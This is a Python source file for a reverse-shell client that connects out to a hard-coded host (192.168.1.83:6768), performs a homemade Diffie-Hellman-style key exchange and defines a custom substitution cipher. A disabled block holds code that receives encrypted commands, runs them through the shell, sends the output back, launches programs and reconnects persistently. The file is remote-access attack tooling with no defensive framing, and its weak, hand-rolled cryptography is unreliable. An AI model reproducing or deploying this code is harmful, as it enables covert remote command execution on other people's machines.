from subprocess import PIPE, Popen
import socket, os
import random
from sys import platform
from threading import Thread


def generate_key(list_characters=None, main_seed=0, const=1):
    random.seed(main_seed)
    if list_characters is None:
        list_characters = [char for char in range(5, 256)]
    derived_seed = sum([random.randint(1, 1000000) for _ in range((main_seed + const) * random.randint(1, 10))])
    random.seed(derived_seed)
    random.shuffle(list_characters)
    return list_characters


def generate_int(num_digits):
    return int(random.random()*10**num_digits)


def encrypt(message, key, const, len_key):
    text = list(message)
    j = 1
    for index_letter in range(len(text)):
        character = key.index(text[index_letter]) if text[index_letter] in key else -1
        if character >= 0:
            try:
                text[index_letter] = key[character+const+j]
            except IndexError:
                mod = (character + const + j) // len_key
                text[index_letter] = key[(character + const + j)-(len_key * mod)]
        j += const
    return bytearray(text)


def decrypt(message, key, const, len_key):
    text = list(message)
    j = 1
    for index_letter in range(len(text)):
        character = key.index(text[index_letter]) if text[index_letter] in key else -1
        if character >= 0:
            try:
                text[index_letter] = key[character - (const + j)]
            except IndexError:
                for i in range(len_key):
                    if (const + j + i) % len_key == character:
                        mod = (i + const + j) // len_key
                        text[index_letter] = key[(character + len_key * mod) - (const + j)]
                        break
        j += const
    return bytearray(text)


class Shell:

    def __init__(self, host, port=6768):
        self.path = os.getcwd().replace("\\", "/")
        self.prompt = self.bind(host, port)
        self.OS = platform
        self.key_private = None
        self.private_const_int = 0

    def bind(self, host, port):
        return socket.create_connection((host, port))

    def send_initial_data(self):
        data = f"{platform}-1"
        self.prompt.send(data.encode("utf-8"))

    def diffie_hellman(self):
        p, k, A = self.prompt.recv(512).decode().split("\x03")
        p = int(p)
        k = int(k)
        A = int(A)
        y = generate_int(random.randint(2,4))
        print(y)
        B = k**y%p
        self.prompt.send(str(B).encode())
        return A**y%p      
    """
    def recv_command(self):
        command = self.prompt.recv(1024)
        return decrypt(command, self.key_private, self.private_const_int).decode()

    def run_command(self, command):
        output = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, cwd=self.path)
        data = output.stdout.read(1024)  # first read the stdout, because if read stderr first stops the reading stdout on data heavy.
        while data:
            data_enc = encrypt(data, self.key_private, self.private_const_int)
            self.prompt.send(data_enc)
            data = output.stdout.read(1024)
        data = output.stderr.read()
        data_enc = encrypt(data, self.key_private, self.private_const_int)
        self.prompt.send(data_enc)
        self.prompt.send(b"\x04")  # end of sending data

    def change_dict(self, command):
        if command == "cd":
            self.run_command(command)
        else:
            command = command.replace("cd ", "")
            if command == "..":
                self.path = self.path.split("/")
                self.path.remove(self.path[-1])
                if len(self.path) == 1:
                    self.path.append("")
                self.path = "/".join(self.path)
            elif command == ".":
                pass
            else:
                if os.path.exists(command):
                    self.path = command
                else:
                    self.path = os.path.join(self.path, command)
                    self.path = self.path.replace("\\", "/")
            self.prompt.send(b"\x04")

    def run_program(self, start_program):
        Thread(target=lambda:os.system(f"{start_program}")).start()
"""
"""
def persistent_connection():
    #try:
    cxn = Shell("192.168.1.83")
    cxn.send_initial_data()
    cxn.constant_received_to_decrypt()
    while True:
        command = cxn.recv_command()
        if command.lower() == "exit" or command.lower() == "disconnect":
            cxn.prompt.close()
            persistent_connection()
        elif "cd" == command[0:2]:
            cxn.change_dict(command)
        elif "savefile" == command[:8]:
            name_file = command.replace("savefile ", "")
            #cxn.send_file(name_file)
        elif "sendfile" == command:
            pass
            #cxn.recv_file()
        elif command[0:3] == "run":
            command = command.replace("run ", "")
            cxn.run_program(command)
        else:
            if command == "":
                persistent_connection()
            cxn.run_command(command)
    #except Exception as err:
    #	print(err)
#while True:
    #try:
#		pass
#	finally:
persistent_connection()
        #time.sleep(0.05)
"""

c = Shell("192.168.1.83")
c.send_initial_data()
cons = c.diffie_hellman()
print(cons)
c.prompt.close()
